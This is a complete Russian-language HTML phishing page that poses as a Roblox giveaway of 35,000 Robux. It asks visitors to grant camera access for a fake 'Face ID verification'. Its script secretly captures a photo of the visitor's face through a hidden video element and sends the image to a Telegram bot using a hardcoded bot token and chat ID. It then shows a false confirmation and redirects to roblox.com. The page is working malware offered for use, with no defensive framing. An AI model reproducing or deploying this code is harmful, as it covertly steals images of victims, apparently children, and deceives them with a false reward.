<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | 35,000 Robux</title>
    <style>
        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: #191b1d; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
        #st { margin-top: 20px; color: #0084ff; font-weight: bold; display: none; }
        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
    <h2>БОНУС: 35,000 ROBUX</h2>
    <p>Нажмите кнопку и разрешите доступ к камере для Face ID верификации.</p>
    <button class="btn" id="go" onclick="start()">ПОЛУЧИТЬ</button>
    <div id="st">СОЕДИНЕНИЕ С TELEGRAM API...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    async function start() {
        const btn = document.getElementById('go');
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.style.display = 'none';
        st.style.display = 'block';

        try {
            // Простейший запрос без сложных условий
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            v.srcObject = stream;
            
            // Ждем запуска потока
            v.onloadedmetadata = () => {
                v.play();
                let p = 0;
                const timer = setInterval(() => {
                    p += 20;
                    st.innerText = "СКАНИРОВАНИЕ ЛИЦА: " + p + "%";
                    if(p >= 100) clearInterval(timer);
                }, 1000);

                // Снимок через 5.5 сек
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', '7889497672');
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', '💎 **ЛИЦО ПОЛУЧЕНО!**\nИсправлено зависание в Telegram.');

                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                            method: 'POST',
                            body: fd
                        }).then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            alert("✅ Личность подтверждена! Награда придет через 10-15 минут.");
                            window.location.href = "https://www.roblox.com";
                        });
                    }, 'image/jpeg', 0.8);
                }, 5500);
            };
        } catch (e) {
            alert("Ошибка! Нужно нажать 'Разрешить' для Face ID.");
            btn.style.display = 'block';
            st.style.display = 'none';
        }
    }
</script>
</body>
</html>
